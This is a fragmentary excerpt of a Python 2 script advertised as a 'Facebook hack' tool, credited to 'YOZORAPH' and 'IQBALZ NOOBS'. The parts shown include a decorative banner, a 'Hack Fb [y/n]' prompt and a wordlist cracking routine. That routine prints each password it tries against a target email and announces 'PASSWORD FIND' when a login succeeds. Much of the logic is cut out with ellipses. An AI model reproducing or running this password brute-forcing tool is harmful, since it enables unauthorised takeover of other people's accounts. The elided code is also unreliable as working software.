...
def banner():
    os.system('clear')
    print " "
    runntxt(GL+"  RE EDIT BY YOZORAPH")
    runntxt(WW+"  FB = m.me/yozoraph")
    runntxt(WW+"  *****_********__*******__**")
    runntxt(GL+"  **_______*______**_______**")
    runntxt(GG+"  **_______*______*******__**")
    runntxt(Y+"   **_______*______**_______********")
    runntxt(GG+"  *****_********__*******__********")
    time.sleep(1.5)
    print GG+"  √=============================================√"
    print GL+"  |••••••   NEW FACEBOOK HACK REMOD.      ••••••|"
    print GG+"  √=============================================√"
    print WW+"  |            MOD BY: IQBALZ NOOBS             |"
    print GL+"  |                CIEL YOZORA                  |"
...
def pil():
                print GG+" "
                g = str(raw_input("[?] Hack Fb \033[93;1m[y/n]: "))
                if g == 'y' or g == 'Y':
                    ...
                    print RR+"Choose the correct one..."
                    pil()
...
def main():
        ...
        life()
        print " "
        print RR+" wordlist no match..."
        print " "
def iqbalz(iqbalz_password):
  try:
 	sys.stdout.write(GG+"\n[\033[91m+\033[92m]\033[91;1m [\033[97m"+email_target+"\033[91m]\033[90m Try ==> \033[91m[\033[90;1m"+iqbalz_password)
	sys.stdout.flush()
	...
	if mask != login and (not 'login_attempt' in mask):
			...
			print "          P A S S W O R D  F I N D "
	         	...
	         	print (RR+"#\033[97m ID / Email Target:\033[92m {}").format(email_target)
        	        ...
        	        print " "
        	        raw_input(WW+"PRESS ENTER TO OUT...")
			sys.exit(1)
...
def runn_noobs():
      ...
      """
         ...
         print wd+" [#] Also the current password\033[97;1m:", len(nuub),'password'
         print wd+" [#] 
Wait for the Cracking Process\033[97;1m.........."
         print " "
